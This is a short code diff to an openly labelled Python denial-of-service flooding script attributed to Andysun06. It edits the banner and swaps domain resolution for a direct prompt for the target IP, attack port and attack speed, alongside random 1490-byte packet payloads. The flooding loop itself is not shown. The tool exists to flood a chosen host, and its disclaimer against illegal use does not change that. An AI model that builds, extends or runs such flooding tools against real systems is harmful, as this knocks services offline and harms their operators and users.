@@ -22,25 +22,17 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print (" ")
-print ("/---------------------------------------------------\\ ")
+print ("/---------------------------------------------------\ ")
 print ("|   作者          : Andysun06                       |")
 print ("|   作者github    : https://github.com/Andysun06    |")
 print ("|   kali-QQ学习群 : 909533854                       |")
 print ("|   版本          : V1.1.0                          |")
 print ("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
-print ("\\---------------------------------------------------/")
+print ("\---------------------------------------------------/")
 print (" ")
 print (" -----------------[请勿用于违法用途]----------------- ")
 print (" ")
-
-target = input("请输入目标域名或IP : ")
-
-try:
-    ip = socket.gethostbyname(target)
-except socket.gaierror:
-    print("无法解析域名，请检查输入是否正确。")
-    sys.exit()
-
+ip = input("请输入 IP     : ")
 port = int(input("攻击端口      : "))
 sd = int(input("攻击速度(1~1000) : "))
 
